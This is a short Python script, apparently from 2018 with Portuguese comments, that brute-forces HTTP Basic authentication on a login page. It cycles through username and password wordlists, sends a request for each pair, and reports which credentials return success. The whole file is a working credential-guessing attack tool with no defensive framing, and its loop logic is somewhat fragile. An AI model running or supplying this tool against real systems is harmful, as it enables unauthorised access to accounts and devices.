import os, requests, sys

# GaMaDeCa - 2018
# Uso>
#  python "HTTP Login Brute Force.py" "http://192.168.0.1/login.html" Usuarios.txt Senhas.txt
#  python "HTTP Login Brute Force.py" "http://192.168.0.1/login.html" ambos.txt
# ambos.txt = Usuarios e Senhas

website=(sys.argv[1])
arquivousuario=(sys.argv[2])

try:
        arquivosenha=(sys.argv[3])
        inserido=(sys.argv[3])
except:
    arquivosenha=arquivousuario
    inserido=arquivosenha

if os.path.isfile(sys.argv[2])==True:
    totaluser=len(open(arquivousuario, 'r').readlines())
    luser=0
    paginauser=open(arquivousuario, 'r')
    usuario=(paginauser.readlines()[0])
    usuario=usuario.replace('\n', '')
else:
    usuario=sys.argv[2]

if os.path.isfile(arquivosenha)==True:
    totalpass=len(open(arquivosenha, 'r').readlines())
    lpass=1
    paginapass=open(arquivosenha, 'r')
    senha=(paginapass.readlines()[0])
    senha=senha.replace('\n', '')
else:
    senha=inserido

while luser != totaluser:
    resposta=requests.get(website, auth=(usuario, senha))
    if resposta.status_code==200:
        print(website + ', ' + usuario + ':' + senha + ' ------ Sucesso 200 ------')
        continua=input("Continuar? (s/n) : ")
        if continua=='n':
            break;
    elif resposta.status_code==401:
        print(website + ', ' + usuario + ':' + senha + ' : Credenciais Incorretas 401')
    elif resposta.status_code==404:
        print(website + ', ' + usuario + ':' + senha + ' : Erro 404')
    elif resposta.status_code==429:
        print(website + ', ' + usuario + ':' + senha + ' : Excesso de Pedidos 429')
    if totalpass==lpass:
        paginauser=open(arquivousuario, 'r')
        luser=luser+1
        usuario=(paginauser.readlines()[luser])
        lpass=0
        usuario=usuario.replace('\n', '')
    paginapass=open(arquivosenha, 'r')
    senha=(paginapass.readlines()[lpass])
    lpass=lpass+1
    senha=senha.replace('\n', '')

print('\--------------[ Concluido ]--------------/')
